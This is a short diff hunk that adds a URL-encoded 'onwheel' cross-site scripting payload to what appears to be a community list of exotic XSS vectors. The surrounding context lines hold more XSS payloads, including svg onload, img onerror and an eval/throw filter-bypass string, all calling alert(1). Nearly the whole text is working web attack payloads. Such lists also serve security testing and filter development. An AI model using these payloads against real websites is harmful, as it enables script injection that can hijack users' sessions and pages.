@@ -10,6 +10,8 @@ I REQUEST TO CONTRIBUTE TO THE PROJECT BY INCLUDING ONLY HIGHLY EXOTIC XSS VECTO
 
 <svg onload="alert(1)" <="" svg=""
 
+%22%3e%3c%5K/onwheel=alert(1)%3emouse%20wheel%20here%3c%21--
+
 „> <img src = x onerror = javascript: alert (1); …
 
 onerror%3Deval%3Bthrow'%3Dalert%5Cx281%5Cx29'%3B
